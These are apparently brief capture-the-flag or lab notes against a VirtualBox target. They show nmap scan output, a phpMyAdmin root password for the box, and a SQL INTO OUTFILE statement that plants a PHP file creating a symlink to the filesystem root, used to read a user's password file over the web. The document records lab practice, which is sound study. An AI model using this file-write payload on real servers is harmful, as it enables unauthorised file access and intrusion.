## Combine PMA + Apache2 exploit
```bash
└─$ sudo nmap -sV 192.168.1.176
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-02 08:50 EST
Nmap scan report for 192.168.1.176 
Host is up (0.00044s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
993/tcp open  ssl/imap Dovecot imapd
MAC Address: 08:00:27:D2:CA:D0 (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

List of all exploit
https://www.exploit-db.com/search?q=apache&type=remote&platform=linux&text=2.2.22

open PhpMyAdmin `root/Fg-'kKXBj87E:aJ$` 


SELECT "<?php symlink(\"/\", \"symlink_root.php\"); ?>" into outfile "/var/www/forum/templates_c/create_symlink_root.php"

Then we only need to open
https://192.168.1.176/forum/templates_c/symlink_root.php/
https://192.168.1.176/forum/templates_c/symlink_root.php/home/LOOKATME/password